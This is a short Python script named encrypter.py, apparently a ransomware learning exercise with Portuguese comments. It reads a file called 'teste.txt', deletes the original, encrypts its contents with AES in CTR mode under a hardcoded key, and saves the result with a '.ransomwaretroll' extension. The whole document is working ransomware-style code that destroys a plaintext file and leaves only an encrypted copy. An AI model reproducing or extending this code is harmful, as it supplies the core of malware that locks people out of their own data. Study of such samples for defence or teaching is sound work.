# encrypter.py
import os
import pyaes
file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()
# Remoção do Arquivo Original
os.remove(file_name)
# Definição da Chave de Encriptação
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key) # Função de Criptografia com base na Chave
# Criptografia do Arquivo
crypto_data = aes.encrypt(file_data)
# Salvamento do Arquivo Criptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()